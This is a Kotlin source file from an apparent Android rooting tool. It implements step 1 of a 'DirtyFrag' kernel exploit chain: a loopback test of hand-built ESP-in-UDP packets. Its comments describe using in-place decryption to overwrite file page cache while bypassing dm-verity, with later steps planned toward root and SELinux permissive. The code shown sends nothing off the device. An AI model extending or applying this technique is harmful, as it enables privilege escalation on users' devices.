package cn.nanoturtle.rootmys9280.manager.rootmy.dirtyfrag

import android.content.Context
import android.net.IpSecAlgorithm
import android.net.IpSecManager
import android.net.IpSecTransform
import android.os.Build
import android.util.Log
import java.io.FileInputStream
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.Mac
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * DirtyFrag 引擎 —— 用户态实现（alpha 阶段：实现阶梯第 1 步）。
 *
 * ## 原理（一句话）
 *
 * Android 内核在**就地解密** AES-CBC 的 ESP-in-UDP 包时，如果包的 payload 是
 * `splice()` 挂上来的**页缓存页**（UDP 数据报拼接路径没打 `SKBFL_SHARED_FRAG`），
 * 解密结果会**直接写进那个文件的页缓存** —— 无需写权限、绕过 COW、绕过 dm-verity。
 *
 * 于是只要构造 IV 让解密输出等于期望内容（单块）：
 *
 * ```
 * IV = AES_ECB_DEC(key, C_old) XOR C_new
 * ```
 *
 * ## 为什么必须自己拼 ESP 包
 *
 * `IpSecTransform` 会让内核对 socket 的出站包自动加密，但那样 **IV 由内核随机生成**，
 * 我们无法控制解密结果。所以：入站走内核 SA（要的副作用在解密路径上），
 * 出站自己拼包（IV 由我们指定），用普通 UDP socket 发到绑了 SA 的封装端口。
 *
 * ## 实现阶梯
 *
 * | 步 | 内容 | 状态 |
 * |---|---|---|
 * | 1 | ESP 自收自发：SA 建好、包拼对、内核能解密 | ← 本文件 |
 * | 2 | splice 页附着（需 native） | 待实现 |
 * | 3 | 块改写（分水岭） | 待实现 |
 * | 4+ | 读页跳板 / LKM / modprobe / permissive / ksud | 待实现 |
 *
 * 第 1 步全在 app 权限内（只需 INTERNET），失败不伤系统，且与内核版本无关，
 * 所以先做它：一旦通过，说明 SA 参数、ESP 布局、ICV 覆盖范围全部正确，
 * 后面接 splice 只是把 payload 的来源从"自建缓冲区"换成"文件页"。
 */
object DirtyFragEngine {

    private const val TAG = "DirtyFragEngine"

    private const val ESP_HEADER_LEN = 8 // SPI(4) + Seq(4)
    private const val IV_LEN = 16
    /**
     * ICV 候选长度（字节）。xfrm 的 authsize 必须与 SA 完全一致，否则 ICV 校验失败
     * 而内核只增加 XfrmInStateProtoError 计数、对我们的 socket 静默丢弃。
     * 实测参考（FEASIBILITY_VERDICT.md）里记录的是 16，先试它，再回退 12。
     */
    private val ICV_CANDIDATES = intArrayOf(16, 12)

    /** ESP NextHeader：59 = No Next Header（回环探测用，不承载内层协议）。 */
    private const val NEXT_HEADER_NO_NEXT = 59

    private const val RECV_TIMEOUT_MS = 3000L

    /** 第 1 步的判定结果。 */
    data class Step1Result(
        val ok: Boolean,
        val detail: String,
        val log: List<String>,
    )

    /** 引擎是否可用（IpSecManager 的 UDP 封装能力自 API 28 起）。 */
    fun isAvailable(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.P

    /**
     * 实现阶梯第 1 步：ESP 自收自发。
     *
     * 分配 UDP 封装 socket 并绑 SA（接收端），再用普通 UDP socket 把**自拼的**
     * ESP 包发过去。内核若按 SA 成功解密，接收端会读回我们写入的明文 ——
     * 证明 ESP 布局、Padding/PadLen/NextHdr、ICV 覆盖范围全部正确。
     */
    fun verifyEspLoopback(context: Context): Step1Result {
        val log = ArrayList<String>()
        fun step(s: String) {
            Log.i(TAG, s)
            log += s
        }

        if (!isAvailable()) return Step1Result(false, "需要 Android 9+ (API 28)", log)

        val ipSecManager =
            context.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
                ?: return Step1Result(false, "IpSecManager 不可用", log)

        // 先做一次**普通 UDP → 普通 UDP** 的对照实验：
        // 它验证的是"发送链路本身"（本机回环、DatagramPacket、字节数）。
        // 若这一步都收不到，问题在发送侧；若它正常而 ESP 路径收不到，
        // 问题就锁定在 UDP 封装 socket / SA / xfrm 处理上。
        run {
            var rx: DatagramSocket? = null
            var tx: DatagramSocket? = null
            try {
                rx = DatagramSocket(0, InetAddress.getByName("127.0.0.1"))
                rx.soTimeout = 2000
                val payload = "RMF-PLAIN-UDP-PROBE".toByteArray()
                tx = DatagramSocket()
                tx.send(
                    DatagramPacket(
                        payload, payload.size,
                        InetAddress.getByName("127.0.0.1"), rx.localPort,
                    )
                )
                val buf = ByteArray(512)
                val pkt = DatagramPacket(buf, buf.size)
                rx.receive(pkt)
                val got = buf.copyOf(pkt.length)
                step(
                    "对照实验（普通 UDP $rx.localPort）：" +
                        if (got.contentEquals(payload)) "收发正常 ✓（发送链路无问题）"
                        else "收到但内容不符 ✗"
                )
            } catch (t: Throwable) {
                step("对照实验（普通 UDP）失败：${t.javaClass.simpleName}: ${t.message}")
            } finally {
                runCatching { tx?.close() }
                runCatching { rx?.close() }
            }
        }

        // authsize 必须与 SA 完全一致，但 API 层给的是 truncLenBits，实际生效值
        // 未必等于我们传入的（取决于 xfrm 后端的处理）。所以逐个试，
        // 每个候选都重建一整套 SPI/SA/socket（SA 一旦建好就不能改 authsize）。
        var last: Step1Result? = null
        for (icvLen in ICV_CANDIDATES) {
            val r = tryOneAuthsize(context, ipSecManager, icvLen)
            r.log.forEach { log += it }
            if (r.ok) return Step1Result(true, r.detail, log)
            last = r
            // 只有当失败原因是"没收到"（ICV 不匹配会被内核静默丢弃）时才值得换 authsize
            if (!r.detail.contains("接收超时")) return Step1Result(false, r.detail, log)
        }
        return last ?: Step1Result(false, "全部 authsize 候选均失败", log)
    }

    /** 用一个指定的 authsize 完整跑一遍 ESP 回环。 */
    private fun tryOneAuthsize(
        context: Context,
        ipSecManager: IpSecManager,
        icvLen: Int,
    ): Step1Result {
        val log = ArrayList<String>()
        fun step(s: String) {
            Log.i(TAG, s)
            log += s
        }
        step("—— 尝试 authsize=$icvLen 字节（${icvLen * 8} bit）——")

        val rng = SecureRandom()
        val cryptKey = ByteArray(16).also { rng.nextBytes(it) } // AES-128-CBC
        val authKey = ByteArray(32).also { rng.nextBytes(it) } // HMAC-SHA256

        var encapSocket: IpSecManager.UdpEncapsulationSocket? = null
        var transform: IpSecTransform? = null
        var spi: IpSecManager.SecurityParameterIndex? = null
        var sender: DatagramSocket? = null
        val loopback = InetAddress.getByName("127.0.0.1")

        try {
            // 1) 分配 SPI（我们自拼的包必须用同一个 SPI，内核才认）。
            spi = ipSecManager.allocateSecurityParameterIndex(loopback)
            step("1. SPI 已分配：0x${spi.spi.toString(16)}")

            // 2) 分配 UDP 封装 socket（用无参重载：系统分配随机端口）。
            //    注意不能传 0 —— openUdpEncapsulationSocket(int) 会校验端口范围并抛
            //    「Specified port must be a valid port number!」，0 并不被接受。
            encapSocket = ipSecManager.openUdpEncapsulationSocket()
            val encapPort = encapSocket.port
            step("2. UDP 封装 socket：port=$encapPort")

            // 2.5) 发送侧 socket 先建好并绑定：它的端口要作为 SA 的封装 remotePort。
            sender = DatagramSocket(0, loopback)
            sender.soTimeout = RECV_TIMEOUT_MS.toInt()
            val senderPort = sender.localPort
            step("2.5 发送 socket 已绑定：port=$senderPort")

            // 3) 建传输模式 SA（AES-CBC + HMAC-SHA256），并**声明 IPv4 UDP 封装**。
            //
            //    setIpv4Encapsulation 是关键：不调它，SA 只是一个普通 transport-mode SA，
            //    内核不会把它与 UDP 封装 socket 关联起来，于是发到封装端口的包
            //    既不进 xfrm4_udp_encap_rcv、xfrm 统计也一动不动（实测确认）。
            //    remotePort 是**对端的封装端口**。自收自发场景里对端就是本机这个
            //    封装 socket，所以填 encapPort —— 之前误填发送方端口，
            //    导致内核自加密的对照包也发去了一个没人在做 ESP 处理的端口。
            transform =
                IpSecTransform.Builder(context)
                    .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, cryptKey))
                    .setAuthentication(
                        IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, authKey, icvLen * 8)
                    )
                    .setIpv4Encapsulation(encapSocket, encapPort)
                    .buildTransportModeTransform(loopback, spi)
            step(
                "3. SA 已建立：AES-CBC-128 + HMAC-SHA256-${icvLen * 8}（传输模式，" +
                    "ESP-in-UDP 封装 remotePort=$encapPort）"
            )
            // SPI：buildTransportModeTransform(remote, spi) 用的就是我们传入的这个
            // SecurityParameterIndex（IpSecTransform 不暴露 getSpi，无法回读）。
            // 若 xfrm 统计里 XfrmInNoStates 增长，说明内核按包里的 SPI 查不到 SA，
            // 优先怀疑这里的 SPI 与 SA 不一致或 SPI 对象已被释放。
            val actualSpi = spi.spi
            step("3.1 拼包使用 SPI=0x${actualSpi.toString(16)}（= 传入 SA 的那个）")

            // 4) 不再调用 applyTransportModeTransform：
            //    它会为 socket 装一条 transport-mode 策略，而 UDP 封装 socket 的
            //    ESP 入站处理本来就是"按端口进 xfrm4_udp_encap_rcv → 用 SPI 查 SA"
            //    自动完成的，不需要策略；装了反而让包先撞上策略匹配失败
            //    （xfrm 统计里 XfrmInTmplMismatch 增长）而被丢弃。
            //    SA 本身在 buildTransportModeTransform 时已进内核。
            step("4. 跳过 applyTransportModeTransform（UDP 封装走自动 SA 查找，见注释）")

            // 5) 自拼 ESP 包。
            val plaintext = "RMF-DIRTYFRAG-ESP-PROBE".toByteArray()
            val esp =
                buildEspPacket(
                    spi = actualSpi,
                    seq = 1,
                    plaintext = plaintext,
                    cryptKey = cryptKey,
                    authKey = authKey,
                    icvLen = icvLen,
                )
            step(
                "5. ESP 包已构造：${esp.size} B（头$ESP_HEADER_LEN + IV$IV_LEN + " +
                    "密文${esp.size - ESP_HEADER_LEN - IV_LEN - icvLen} + ICV$icvLen）"
            )
            // 诊断用：把包与密钥 dump 出来，便于离线用 openssl 复算 ICV/解密，
            // 从而区分"我们的密码学错"与"内核 SA 参数(algorithm/authsize)不符"。
            step("DUMP esp=" + esp.joinToString("") { "%02x".format(it) })
            step("DUMP cryptKey=" + cryptKey.joinToString("") { "%02x".format(it) })
            step("DUMP authKey=" + authKey.joinToString("") { "%02x".format(it) })

            // 6) 用普通 UDP socket 发到封装端口（绕过 SA 出站加密）。
            //    sender 已在第 2.5 步绑定好，端口在 SA 里作为 remotePort 声明过了。
            sender.send(DatagramPacket(esp, esp.size, loopback, encapPort))
            step("6. 已从 $senderPort 发送到封装端口 $encapPort（${esp.size} B）")

            // 7) 从封装 socket 读：内核解密后应为原始明文。
            val got = readFromEncap(encapSocket)
            if (got == null) {
                // 手工包没被接受 → 做一次**对照**：让内核自己加密（出站 transform），
                // 走同一条 SA + 封装 socket 路径。
                //   对照成功 = SA 与本机 ESP 路径都是通的，问题只在"手工包与内核期望不符"；
                //   对照也失败 = SA 参数或封装 socket 本身有问题。
                step("手工包未通过，做内核自加密对照…")
                val probe = "RMF-KERNEL-ENCAP-PROBE".toByteArray()
                try {
                    ipSecManager.applyTransportModeTransform(
                        sender,
                        IpSecManager.DIRECTION_OUT,
                        transform,
                    )
                    sender.send(DatagramPacket(probe, probe.size, loopback, encapPort))
                    val got2 = readFromEncap(encapSocket)
                    step(
                        "对照（内核自加密）：" +
                            if (got2 != null && got2.contentEquals(probe))
                                "成功 ✓ 说明 SA 与 ESP 路径正常，问题在手工包构造"
                            else if (got2 != null)
                                "收到 ${got2.size} B 但内容不符：${got2.joinToString(" ") { "%02x".format(it) }}"
                            else "也超时 ✗ 说明 SA 参数或封装 socket 本身有问题"
                    )
                } catch (t: Throwable) {
                    step("对照（内核自加密）异常：${t.javaClass.simpleName}: ${t.message}")
                }
                return Step1Result(false, "接收超时：内核未解密该 ESP 包（SA 未生效或包格式不符）", log)
            }
            step("7. 读回 ${got.size} B：${got.joinToString(" ") { "%02x".format(it) }}")

            return if (got.contentEquals(plaintext)) {
                step("✔ 与明文逐字节一致 —— ESP 布局与 ICV 正确，内核解密路径成立")
                Step1Result(true, "ESP 自收自发成功（${got.size} B 明文回环）", log)
            } else {
                Step1Result(false, "读回内容与明文不符（长度 ${got.size}，期望 ${plaintext.size}）", log)
            }
        } catch (t: Throwable) {
            step("✗ 异常：${t.javaClass.simpleName}: ${t.message}")
            return Step1Result(false, "${t.javaClass.simpleName}: ${t.message}", log)
        } finally {
            runCatching { sender?.close() }
            runCatching { transform?.close() }
            runCatching { encapSocket?.close() }
            runCatching { spi?.close() }
        }
    }

    /**
     * 构造完整 ESP-in-UDP 报文（RFC 4303 布局）。
     *
     * ```
     * [ SPI(4) | Seq(4) | IV(16) | 密文(16*n) | ICV(12) ]
     * ```
     * 密文 = AES-CBC(key, IV) 加密 `payload + Padding + PadLen(1) + NextHdr(1)`；
     * ICV = HMAC-SHA256(authKey) 覆盖 `[SPI .. 密文末尾]`，截断到 96 bit。
     *
     * Padding 长度取 1..16，使「payload + padding + 2」落在 16 字节边界上
     * （PadLen 与 NextHdr 自身也要计入）。
     */
    private fun buildEspPacket(
        spi: Int,
        seq: Int,
        plaintext: ByteArray,
        cryptKey: ByteArray,
        authKey: ByteArray,
        icvLen: Int,
        iv: ByteArray = ByteArray(IV_LEN).also { SecureRandom().nextBytes(it) },
    ): ByteArray {
        val rem = (plaintext.size + 2) % 16
        val padLen = if (rem == 0) 0 else 16 - rem
        val padding = ByteArray(padLen) { (it + 1).toByte() }

        val toEncrypt = ByteArray(plaintext.size + padding.size + 2)
        plaintext.copyInto(toEncrypt, 0)
        padding.copyInto(toEncrypt, plaintext.size)
        toEncrypt[toEncrypt.size - 2] = padding.size.toByte() // PadLen
        toEncrypt[toEncrypt.size - 1] = NEXT_HEADER_NO_NEXT.toByte() // NextHdr

        val cipher = Cipher.getInstance("AES/CBC/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(cryptKey, "AES"), IvParameterSpec(iv))
        val ciphertext = cipher.doFinal(toEncrypt)

        // ICV 覆盖范围：[SPI | Seq | IV | 密文]
        val espNoIcv = ByteArray(ESP_HEADER_LEN + IV_LEN + ciphertext.size)
        putIntBe(espNoIcv, 0, spi)
        putIntBe(espNoIcv, 4, seq)
        iv.copyInto(espNoIcv, ESP_HEADER_LEN)
        ciphertext.copyInto(espNoIcv, ESP_HEADER_LEN + IV_LEN)

        val mac = Mac.getInstance("HmacSHA256")
        mac.init(SecretKeySpec(authKey, "HmacSHA256"))
        val icvFull = mac.doFinal(espNoIcv)

        val esp = ByteArray(espNoIcv.size + icvLen)
        espNoIcv.copyInto(esp, 0)
        icvFull.copyInto(esp, espNoIcv.size, 0, icvLen)
        return esp
    }

    /**
     * 从 UDP 封装 socket 读一帧（内核已解密），带超时。
     *
     * FileDescriptor 上的 read 是**阻塞**的，且 socket 的 SO_RCVTIMEO 这里设不了；
     * 若内核因 ICV 不匹配而静默丢弃我们的包，裸 read 会永久挂住主流程
     * （上一版就卡在这里）。所以放到独立线程里读，主线程只等 timeoutMs。
     */
    private fun readFromEncap(
        socket: IpSecManager.UdpEncapsulationSocket,
        timeoutMs: Long = RECV_TIMEOUT_MS,
    ): ByteArray? {
        val fd = socket.fileDescriptor
        val buf = ByteArray(2048)
        val task = java.util.concurrent.FutureTask<Int> {
            // 不 close：fd 的所有权仍归封装 socket，关闭会让 finally 里的 close 二次关闭。
            java.io.FileInputStream(fd).read(buf)
        }
        val worker = Thread(task, "dfr-esp-read")
        worker.isDaemon = true
        worker.start()
        return try {
            val n = task.get(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (n <= 0) null else buf.copyOf(n)
        } catch (t: java.util.concurrent.TimeoutException) {
            worker.interrupt()
            null
        } catch (t: Throwable) {
            null
        }
    }

    private fun putIntBe(dst: ByteArray, off: Int, v: Int) {
        dst[off] = (v ushr 24).toByte()
        dst[off + 1] = (v ushr 16).toByte()
        dst[off + 2] = (v ushr 8).toByte()
        dst[off + 3] = v.toByte()
    }
}
